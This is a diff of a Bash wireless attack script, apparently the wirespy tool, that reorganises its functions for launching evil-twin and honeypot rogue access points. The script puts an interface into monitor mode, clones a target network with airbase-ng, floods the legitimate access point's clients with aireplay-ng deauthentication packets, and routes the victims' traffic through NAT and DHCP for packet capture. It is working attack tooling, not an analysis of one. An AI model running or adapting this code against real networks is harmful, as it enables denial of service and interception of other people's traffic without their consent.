@@ -138,15 +138,15 @@ function check_compatibility() {
 
 function help {
     echo -e """
-${FG_GREEN}help$RESET_FG          : list available commands
-${FG_GREEN}clear$RESET_FG         : clear the screen
-${FG_GREEN}quit$RESET_FG          : exit the script gracefully
-${FG_GREEN}run honeypot$RESET_FG  : launch a rogue access point
 ${FG_GREEN}run eviltwin$RESET_FG  : launch an evil-twin attack
+${FG_GREEN}run honeypot$RESET_FG  : launch a rogue access point
+${FG_GREEN}run powerup$RESET_FG   : run powerup wireless interface
 ${FG_GREEN}show leases$RESET_FG   : display the DHCP leases
 ${FG_GREEN}start capture$RESET_FG : start packet capture
 ${FG_GREEN}stop capture$RESET_FG  : stop packet capture
-${FG_GREEN}run powerup$RESET_FG   : run powerup wireless interface
+${FG_GREEN}clear$RESET_FG         : clear the screen
+${FG_GREEN}help$RESET_FG          : list available commands
+${FG_GREEN}quit$RESET_FG          : exit the script gracefully
 """
 }
 
@@ -170,19 +170,19 @@ function menu() {
                 clean_up &> /dev/null
                 PROMPT=$PROMPT_EVILTWIN
                 configure_intfs
-                configure_eviltwin
+                eviltwin
                 isAP=true
                 ;;
             'run honeypot')
                 clean_up &> /dev/null
                 PROMPT=$PROMPT_HONEYPOT
                 configure_intfs
-                configure_honeypot
+                honeypot
                 isAP=true
                 ;;
             'run powerup')
                 PROMPT=$PROMPT_POWERUP
-                intf_boost
+                powerup
                 ;;
             'show leases')
                 if [[ $isAP = false ]]; then
@@ -235,7 +235,7 @@ function configure_intfs() {
 
     print_wirespy 'Select the internet-facing interface:'
 
-    display_intf
+    display_intfs
 
     while [[ $res != 0 ]]; do
         read -p "$(echo -e $PROMPT) " INTF
@@ -264,7 +264,7 @@ function configure_intfs() {
 
     print_wirespy 'Select the wireless interface to use:'
 
-    display_wintf
+    display_wintfs
 
     while [[ $res != 0 ]]; do
         read -p "$(echo -e $PROMPT) " WINTF
@@ -276,7 +276,6 @@ function configure_intfs() {
             res=1
         fi
     done
-    res=1
 
     # prevent wlan adapter soft blocking
     rfkill unblock wifi
@@ -284,18 +283,19 @@ function configure_intfs() {
     # put the wireless interface into "monitor" mode
     # add a check to ensure monitor mode has started or exit the script
     print_info "Starting monitor mode on $WINTF..."
+
+    # get return code
     iw dev "$WINTF" set type monitor
-    MINTF=$WINTF
-    # crucial to let WINTF come up before macchanging
-    sleep 2
 
-    check_intf "$MINTF"
-    res=$?
-
-    if [[ $res != 0 ]]; then
+    if [[ $? = 0 ]]; then
+        print_info "Monitor mode started"
+    else
         print_error "$WINTF could not enter monitor mode"
         exit 1
     fi
+    MINTF=$WINTF
+    # crucial to let WINTF come up before macchanging
+    sleep 2
 
     print_wirespy "Do you wish to randomise $MINTF MAC address (recommended)?"
 
@@ -315,10 +315,9 @@ function configure_intfs() {
 }
 
 
-function configure_honeypot() {
+function honeypot() {
     local -i attack_type=0
     local pass=false
-    local -i res=1
 
     echo "$HONEYPOT"
 
@@ -401,25 +400,22 @@ function configure_honeypot() {
     # extracting the tap interface
     TINTF=$(grep 'Created tap interface' ./conf/tmp.txt | awk '{print $5}')
     check_intf "$TINTF"
-    res=$?
 
-    if [[ $res != 0 ]]; then
+    if [[ $? != 0 ]]; then
         print_error "$AIRBASE_ERROR"
         sleep 4
         quit
     fi
 
-    set_up_iptables
-    set_up_DHCP_server
+    enable_internet
     
     print_info "$ESSID honeypot is now running..."
     sleep 6
 }
 
 
-function configure_eviltwin() {
+function eviltwin() {
     local pass=false
-    local -i res=1
 
     echo "$EVILTWIN"
 
@@ -446,58 +442,50 @@ function configure_eviltwin() {
 
     xterm -fg green -title "Evil-twin - $eviltwin_ESSID" -e "airbase-ng -c $WCHAN -e $eviltwin_ESSID -P $MINTF | tee ./conf/tmp.txt 2> /dev/null" &
     XTERM_AIRBASE_PID=$!
-    echo "XTERM XTERM_AIRBASE_PID $XTERM_AIRBASE_PID"
     sleep 4     # crucial to let TINTF come up before setting it up
 
     # extracting the tap interface
     TINTF=$(grep 'Created tap interface' ./conf/tmp.txt | awk '{print $5}')
     check_intf "$TINTF"
-    res=$?
 
-    if [[ $res != 0 ]]; then
+    if [[ $? != 0 ]]; then
         print_error "$AIRBASE_ERROR"
         quit
     fi
 
     # de-auth the legit connected users
-    xterm -fg green -title "aireplay-ng - $eviltwin_ESSID" -e "aireplay-ng --ignore-negative-one --deauth 0 -a $eviltwin_BSSID $MINTF" &
+    xterm -fg green -title "aireplay-ng - $eviltwin_ESSID" -e "aireplay-ng --ignore-negative-one --deauth 0 -a $eviltwin_BSSID -e eviltwin_ESSID $MINTF" &
     XTERM_AIREPLAY_PID=$!
-    echo "XTERM XTERM_AIREPLAY_PID $XTERM_AIREPLAY_PID"
     sleep 4
 
-    set_up_iptables
-    set_up_DHCP_server
+    enable_internet
     
     print_info "$eviltwin_ESSID evil-twin is now running..."
     sleep 6
 }
 
 
-function set_up_iptables() {
-    print_info 'Configuring NAT iptables...'
+function enable_internet() {
+    # configuring the newly created tap intrface
+    ip addr flush dev "$TINTF"
+    ip link set "$TINTF" down && ip addr add 10.0.0.254/24 dev "$TINTF" && ip link set "$TINTF" up
+    ip route flush dev "$TINTF"
+    ip route add 10.0.0.0/24 via 10.0.0.254 dev "$TINTF"
 
+    print_info 'Enabling IP forwarding'
+    echo '1' > /proc/sys/net/ipv4/ip_forward
+    # setting up ip address and route
+
+    print_info 'Configuring NAT iptables...'
     # cleaning the mess
     iptables --flush
     iptables --table nat --flush
     iptables --delete-chain
     iptables --table nat --delete-chain
-
     # iptables rules
     iptables -P FORWARD ACCEPT
     # forward the traffic via the internet facing interface
     iptables -t nat -A POSTROUTING -o "$INTF" -j MASQUERADE
-}
-
-
-function set_up_DHCP_server() {
-    print_info 'Enabling IP forwarding'
-    echo '1' > /proc/sys/net/ipv4/ip_forward
-
-    # setting up ip address and route
-    ip addr flush dev "$TINTF"
-    ip link set "$TINTF" down && ip addr add 10.0.0.254/24 dev "$TINTF" && ip link set "$TINTF" up
-    ip route flush dev "$TINTF"
-    ip route add 10.0.0.0/24 via 10.0.0.254 dev "$TINTF"
 
     # reset any pre-existing dhcp leases
     print_info 'Resetting pre-existing DHCP leases'
@@ -511,12 +499,12 @@ function set_up_DHCP_server() {
 
     # starting the DHCP service
     print_info 'Starting DHCP server to provide the victims with internet access...'
-    /etc/init.d/isc-dhcp-server restart 
+    /etc/init.d/isc-dhcp-server start 
     sleep 4
 }
 
 
-function display_intf() {
+function display_intfs() {
     intfs=$(ip -o link show | awk -F': ' '{print $2}' | grep -v 'lo')
 
     if [[ $intfs ]]; then
@@ -533,7 +521,7 @@ function display_intf() {
 
 
 # use the iw utility instead of the ip utility
-function display_wintf() {
+function display_wintfs() {
     wintfs=$(ip -o link show | awk -F': ' '{print $2}' | grep 'wlan')
 
     if [[ $wintfs ]]; then
@@ -559,13 +547,13 @@ function check_intf() {
 }
 
 
-function intf_boost() {
+function powerup() {
     local -i res=1
     local WINTF=''
 
     print_wirespy 'Select the wireless interface to boost-up:'
 
-    display_wintf
+    display_wintfs
 
     while [[ $res != 0 ]]; do
         read -p "$(echo -e $PROMPT_POWERUP) " WINTF
@@ -584,36 +572,42 @@ function intf_boost() {
 
 
 function clean_up() {
-    local pass=false
-    local -i res=1
-
     if [[ $isAP = true ]]; then
         print_info "Terminating active processes..."
-        kill -SIGKILL "$XTERM_AIRBASE_PID" "$XTERM_AIREPLAY_PID"
-        sleep 4
+        if [[ $XTERM_AIRBASE_PID ]]; then
+            kill -SIGKILL "$XTERM_AIRBASE_PID" 
+        fi
+        if [[ $XTERM_AIREPLAY_PID ]]; then
+            kill -SIGKILL "$XTERM_AIREPLAY_PID"
+        fi
+        sleep 2
     
         print_info "Removing temporary files"
         rm -f ./conf/tmp.txt
 
         check_intf "$MINTF"
-        res=$?
 
-        if [[ $res = 0 ]]; then
-            # add a check to ensure that managed mode has started or print warning
+        if [[ $? = 0 ]]; then
             print_info "Starting managed mode on $MINTF..." 
             iw dev "$MINTF" set type managed
+
+            if [[ $? = 0 ]]; then
+                print_info "Managed mode started"
+            else
+                print_error "$MINTF could not enter managed mode"
+                exit 1
+            fi
             sleep 2
         fi
-        pass=false
+
+        print_info 'Disabling IP forwarding'
+        echo '0' > /proc/sys/net/ipv4/ip_forward
 
         print_info 'Flushing iptables'
         iptables --flush
         iptables --table nat --flush
         iptables --delete-chain
         iptables --table nat --delete-chain
-
-        print_info 'Disabling IP forwarding'
-        echo '0' > /proc/sys/net/ipv4/ip_forward
 
         print_info 'Restoring /etc/dhcp/dhcpd.conf and /etc/default/isc-dhcp-server original configurations'
         mv /etc/dhcp/dhcpd.conf~ /etc/dhcp/dhcpd.conf
